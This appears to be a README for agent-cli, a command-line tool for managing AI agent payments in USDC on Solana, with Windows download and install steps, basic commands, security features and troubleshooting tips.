# 🤖 agent-cli - Manage AI Agent Payments Easily

[![Download agent-cli](https://img.shields.io/badge/Download-Agent--CLI-brightgreen)](https://github.com/fabiospergort/agent-cli)

## 📋 About agent-cli

agent-cli is a command-line tool built for handling AI agents in the AI economy. It helps you earn, pay, and manage funds smoothly. You can use it to access a variety of paid APIs, create invoices to receive money, ask for payments from authorized users, and send or receive payments in USDC cryptocurrency. agent-cli works with built-in safety features like spending limits and owner approvals, and it uses FROST threshold signing on the Solana blockchain for security.

This tool is open-source and made to give users clear control over AI agent financial actions without requiring deep technical skills.

---

## 💻 System Requirements

To run agent-cli on your Windows computer, make sure your system matches these requirements:

- Windows 10 or newer (64-bit recommended)  
- Minimum 4 GB of RAM  
- At least 100 MB of free disk space  
- Internet access required for API calls and blockchain interaction  
- Basic command-line interface functioning (Command Prompt or PowerShell)  

If you are unsure about command-line use, this guide will walk you through the setup step-by-step.

---

## 🚀 Getting Started with agent-cli on Windows

This section explains how to download and run agent-cli on your Windows PC without needing programming knowledge.

### Step 1: Visit the Download Page

Click the big green button above or open this link in your browser:  
https://github.com/fabiospergort/agent-cli

This link takes you to the project page where you can find the latest version of the software.

### Step 2: Download agent-cli

On the page, look for the **Releases** section. Follow these instructions:

1. Click on the "Releases" tab or scroll down to find the latest release.  
2. Look for a file ending with `.exe` or a Windows installer file.  
3. Click to download the file to your computer.

### Step 3: Run the Installer

Once the download finishes:

1. Locate the downloaded file. Usually, it is in your **Downloads** folder.  
2. Double-click the file to start the installer.  
3. Follow the setup prompts on the screen. Use the default options if unsure.  
4. Wait for the installation to complete.

### Step 4: Open agent-cli

After installation:

1. Press the **Windows key** on your keyboard and type `cmd`, then press Enter to open the Command Prompt.  
2. Type `agent-cli` and press Enter. The program should start, and you will see its main menu or help commands displayed.

---

## ⚙️ Using agent-cli

agent-cli works using simple commands you can type into the Command Prompt. Here are some basic commands to get you started:

- List available APIs to access:  
  `agent-cli list-apis`

- Create an invoice to receive funds:  
  `agent-cli create-invoice --amount 100 --currency USDC`

- Request funds from an owner:  
  `agent-cli request-funds --owner <owner_id> --amount 50`

- Send a payment:  
  `agent-cli send-payment --to <recipient_wallet> --amount 75`

- Approve or review payments with owner approval prompts built in.

You can always view all command options by typing:  
`agent-cli help`

This will show you all commands and how to use them step-by-step.

---

## 🔒 Security Features

agent-cli includes safety controls to protect your finances:

- **Owner approvals:** Actions like payment sending require confirmation from authorized users.  
- **Spending guardrails:** Set limits on spending to prevent accidental overpayment.  
- **FROST threshold signing on Solana:** Uses advanced cryptographic methods to secure transactions on the blockchain.  

These features work silently but add layers of protection under the surface.

---

## 🔧 Configuring agent-cli

You can customize agent-cli settings to fit your needs:

- **Wallet setup:** Link your USDC Solana wallet by following prompts after first launch.  
- **API keys:** Store your API keys securely inside the tool for paid services on x402 APIs.  
- **Spending limits:** Set or update purse guardrails to control daily or monthly spending allowances.  

All configurations are saved on your computer and loaded automatically every time you start agent-cli.

---

## 🛠️ Troubleshooting common issues

If you encounter problems, here are a few quick fixes:

- **agent-cli not recognized:**  
  Make sure you completed the installer and restarted your Command Prompt.  

- **Cannot connect to APIs:**  
  Check your internet connection and firewall settings to allow agent-cli access.  

- **Unexpected errors during payment:**  
  Verify your wallet configuration and ensure your owner approvals are set properly.

For detailed help, you can visit the main project page for the latest troubleshooting tips.

---

## 📥 Download and Installation Link

You can download and install agent-cli from here:  
[https://github.com/fabiospergort/agent-cli](https://github.com/fabiospergort/agent-cli)

Click this link to open the GitHub page where you will find the download files and latest updates.

---

## 🧰 Additional Help

If you want more support:

- Check the **README.md** or **Wiki** on the GitHub page for detailed guides.  
- Explore community discussions or open an issue to ask for help directly.  
- Use the `agent-cli help` command to learn more about commands and usage.

This setup is meant to be simple for everyday users without programming background. Follow these steps and you will be able to manage AI agent-related payments confidently.